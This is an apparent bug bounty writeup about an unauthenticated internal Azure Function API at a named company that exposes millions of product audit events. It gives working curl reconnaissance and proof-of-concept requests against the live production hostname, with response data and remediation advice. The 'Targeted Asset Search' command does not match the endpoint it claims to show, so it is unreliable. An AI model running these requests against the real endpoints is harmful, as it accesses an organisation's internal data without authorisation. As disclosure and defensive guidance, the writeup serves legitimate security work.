---
title: "Unauthenticated Internal Azure Function API Exposing 4.7M+ GPIM Product Events"
date: 2026-11-12 19:30:00 +0200
categories: [Bug Bounty, Writeups]
tags: [bug-bounty, api-security, broken-access-control, azure-functions, recon]
---

> **Disclaimer:** This writeup is shared strictly for educational purposes after following responsible disclosure guidelines. Only minimal, read-only requests were performed to verify the vulnerability without extracting sensitive bulk data.

## Introduction

During reconnaissance on corporate subdomains, I noticed an interesting anomaly in how authentication was enforced across internal applications. While almost all sibling applications on the `app.essity.com` domain (such as `argocd`, `idmtool`, `adminutil-ui`, `qualys`, and `pim`) were properly protected behind **Azure AD Single Sign-On (SSO)**, one application stood out: `qrm.app.essity.com`.

This application—an internal **"Product Journey — Quality Report and Monitoring"** tool—loaded directly without requiring any session or login prompt.

---

## Discovery & JavaScript Bundle Analysis

Inspecting the frontend revealed a Vue.js Single Page Application (SPA). To understand where the application fetches its data, I examined the main JavaScript bundle (`index.js`, ~582 KB).

Inside the bundle, the backend API URL was hardcoded directly into the client-side components (`EventsList.vue`, `EventsSearch.vue`, and `QrmAssetReportModal.vue`):

```text
https://fn-prod-product-journey.azurewebsites.net/api
```

Using `curl` and `grep` to inspect the bundle confirmed two critical findings:
1. The frontend makes direct `fetch()` calls to the Azure Function backend.
2. There are **no authentication headers or API keys** (`Authorization`, `x-functions-key`, or `apikey`) anywhere in the client code.

```bash
curl -s "https://qrm.app.essity.com/js/index.js" | grep -o "https://fn-prod-product-journey.azurewebsites.net[^\"']*" | sort -u
curl -s "https://qrm.app.essity.com/js/index.js" | grep -cE "x-functions-key|Authorization|apikey"
# Output: 0
```

---

## Vulnerability Details & Endpoints

Because the Azure Function backend did not enforce authentication or restrict access to its `*.azurewebsites.net` hostname, anyone on the internet could query the API directly.

Analysis of the Vue components exposed several unauthenticated endpoints:

| Method | Endpoint | Description |
| :--- | :--- | :--- |
| `GET` | `/api/events` | Returns paginated GPIM product and asset audit events. |
| `GET` | `/api/search/{itemType}/{itemKey}/{timerange}` | Searches events by type (`mv`, `pv`, `bp`, `asset`) and timeframe. |
| `GET` | `/api/qrm_report/{assetId}/{catalogKey}` | Fetches quality report statistics for a specific asset and catalog. |
| `GET` | `/api/qrm_history_report_search/{assetId}` | Retrieves historical status changes for an asset. |

<img width="796" height="508" alt="image" src="https://github.com/user-attachments/assets/a44e6a0e-657f-4026-8301-8b77a34cf467" />


---

## Proof of Concept (PoC)

### 1. Listing Global Product Events
Sending a simple unauthenticated `GET` request to `/api/events` returned `HTTP 200 OK` along with the total record count exceeding **4.69 million events**:

```bash
curl -s "https://fn-prod-product-journey.azurewebsites.net/api/events"
```

**Response Snippet:**
```json
{
  "count": 4693271,
  "numberOfPages": 93866.0,
  "events": [
    {
      "TimeGenerated": "2026-11-12T11:28:09.4779853Z",
      "cloud_sourced_s": "true",
      "catalog_s": "CZ - Country:Published catalog",
      "e_s": "PRODUCT_VARIANT_SYNCED_TO_TARGET",
      "pv_s": "46115021",
      "pvn_s": "Tork Xpress® Soft Natural Multifold Hand Towel Advanced",
      "system": "GPIM"
    }
  ]
}
```

### 2. Targeted Asset Search
Using an asset ID observed from the initial response, querying the search endpoint with an RFC3339 timestamp also succeeded without authentication:

```bash
curl -s "https://azurewebsites.net"
```

---

## Impact

* **Massive Data Exposure:** Over **4.69 million** internal GPIM (Global Product Information Management) audit logs across 93,866 pages were accessible without authentication.
* **Competitive Intelligence Leak:** The exposed catalog mappings included both `Published` and `Draft` (unreleased) country catalogs, revealing unreleased product variants, internal asset codes, and product hierarchies.
* **SSO Bypass:** Even if SSO were added to the frontend domain, attackers could still query the Azure Function directly via its default `azurewebsites.net` endpoint.

---

## Remediation

To secure the application and its backend infrastructure, the following steps were recommended:
1. **Enable Azure Functions Authentication (Easy Auth):** Enforce Azure AD authentication directly on the Function App or place it behind Azure API Management (APIM) with OAuth2 validation.
2. **Restrict Direct Hostname Access:** Configure Private Endpoints or IP restrictions on the Azure Function so it cannot be reached directly via `*.azurewebsites.net`.
3. **Enforce Frontend SSO:** Protect `qrm.app.essity.com` behind Azure AD SSO to match the security posture of sibling corporate applications.
4. **Implement Rate Limiting & Pagination Controls:** Restrict excessive page sizes and apply rate limiting to prevent bulk scraping.
